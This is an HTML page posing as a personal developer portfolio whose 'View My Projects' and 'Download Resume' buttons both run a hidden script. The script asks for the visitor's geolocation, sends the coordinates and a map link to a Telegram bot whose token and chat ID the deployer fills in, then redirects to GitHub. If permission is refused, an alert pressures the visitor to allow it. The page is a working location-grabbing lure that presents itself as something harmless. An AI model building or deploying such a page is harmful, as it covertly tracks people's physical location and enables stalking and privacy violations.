<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Personal Portfolio</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
        body { font-family: 'Poppins', sans-serif; background: #0f172a; color: white; }
        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="glass max-w-md w-full rounded-2xl p-8 text-center shadow-2xl">
        <div class="w-24 h-24 mx-auto mb-4 rounded-full border-4 border-blue-500 p-1">
            <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Felix" class="rounded-full bg-slate-700">
        </div>
        
        <h1 class="text-2xl font-bold mb-2">Hey, I'm Ajit! ðŸ‘‹</h1>
        <p class="text-slate-400 text-sm mb-6">Full Stack Developer | UI/UX Designer | Tech Enthusiast</p>

        <div class="space-y-4">
            <button onclick="start()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition duration-300 shadow-lg">
                View My Projects
            </button>
            
            <button onclick="start()" class="w-full glass hover:bg-white/10 text-white font-semibold py-3 rounded-lg transition duration-300">
                Download Resume
            </button>
        </div>

        <div class="mt-8 pt-6 border-t border-white/10 flex justify-center space-x-6 text-slate-400">
            <span>Insta</span>
            <span>GitHub</span>
            <span>LinkedIn</span>
        </div>

        <p id="status" class="mt-4 text-xs text-blue-400 hidden italic">Connecting to secure server...</p>
    </div>

    <script>
        // --- APNI DETAILS YAHAN DALO ---
        const BOT_TOKEN = "TUMHARA_TOKEN_YAHAN";
        const CHAT_ID = "TUMHARI_CHAT_ID_YAHAN";

        function start() {
            document.getElementById('status').classList.remove('hidden');
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    const msg = `ðŸ”¥ *New Portfolio Hit!*%0A%0AðŸ“ *Lat:* ${lat}%0AðŸ“ *Lon:* ${lon}%0AðŸ—ºï¸ *Maps:* https://www.google.com/maps?q=${lat},${lon}`;

                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}&parse_mode=Markdown`)
                    .then(() => {
                        // Redirect user to real content after hit
                        window.location.href = "https://github.com"; 
                    });

                }, function(err) {
                    alert("Please allow permission to view portfolio content.");
                });
            }
        }
    </script>
</body>
</html>
